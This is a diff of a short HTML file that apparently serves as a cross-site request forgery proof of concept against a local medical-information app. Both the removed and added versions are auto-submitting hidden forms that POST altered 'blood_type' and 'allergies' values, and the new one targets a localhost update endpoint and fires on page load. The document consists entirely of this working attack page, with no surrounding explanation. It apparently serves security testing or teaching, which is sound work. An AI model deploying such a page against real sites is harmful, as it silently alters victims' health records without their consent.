@@ -1,10 +1,7 @@
-<body onload="document.forms[0].submit()">
-    <form method="POST" action="">
-        <input type="hidden" name="blood_type" value="CSRF_PWNED" />
-        <input
-            type="hidden"
-            name="allergies"
-            value="Vulnerable to CSRF Attack!"
-        />
-    </form>
-</body>
+<form id="attack" method="POST" action="http://127.0.0.1:8000/update-info/">
+    <input type="hidden" name="blood_type" value="PWNED" />
+    <input type="hidden" name="allergies" value="Vulnerable to CSRF Attack" />
+</form>
+<script>
+    document.getElementById("attack").submit();
+</script>
